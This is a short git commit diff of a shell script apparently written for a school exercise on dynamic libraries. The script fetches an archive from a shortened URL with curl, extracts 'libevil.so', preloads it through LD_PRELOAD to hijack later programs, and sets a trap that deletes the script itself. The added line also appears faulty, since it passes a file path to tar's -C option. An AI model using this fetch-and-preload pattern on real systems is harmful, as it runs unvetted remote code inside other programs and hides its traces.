ef83f7dfe78553fcc526fa4b84df953880a39a96
patrickdeyoreo <pdeyoreo@gmail.com>
2019-09-17 04:38:40 -0700

    Extracting libevil.so directly to tmpdir

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 trap 'trap $('"$(printf 'rm -f %q' "${BASH_SOURCE[0]}")"') RETURN' RETURN
 export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
-tar -Oxzf <(curl -sL https://tinyurl.com/1i83vi1) 1> "${LD_PRELOAD%%:*}"
+tar -C "${LD_PRELOAD%%:*}" -xzf <(curl -sL https://tinyurl.com/1i83vi1)
